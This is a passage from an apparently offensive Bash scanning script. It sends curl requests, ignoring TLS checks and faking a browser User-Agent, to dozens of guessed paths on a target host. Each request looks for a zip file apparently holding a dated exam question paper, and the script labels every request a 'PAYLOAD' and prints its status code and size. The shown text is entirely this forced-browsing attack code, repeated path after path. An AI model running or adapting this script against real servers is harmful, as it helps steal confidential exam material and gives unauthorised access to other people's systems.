" "${target}QPControl-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
